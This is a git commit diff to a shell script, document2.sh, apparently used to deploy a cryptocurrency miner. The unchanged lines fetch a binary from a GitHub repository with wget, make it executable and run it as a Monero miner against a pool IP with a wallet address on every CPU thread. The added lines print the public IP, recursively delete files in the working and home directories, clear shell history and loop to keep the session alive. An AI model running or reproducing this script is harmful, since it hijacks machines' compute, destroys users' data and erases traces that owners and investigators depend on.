27ef9f3e6058f34b0142eee2664514f5e408aa72
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-06-09 16:30:04 +0700

    Update document2.sh

--- document2.sh
+++ document2.sh
@@ -83,3 +83,13 @@ EOF
 nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
 chmod 777 mmm
 ./mmm --donate-level 1 -o 162.243.171.178:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Free -a rx/0 -t $(nproc --all)
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 30
+done
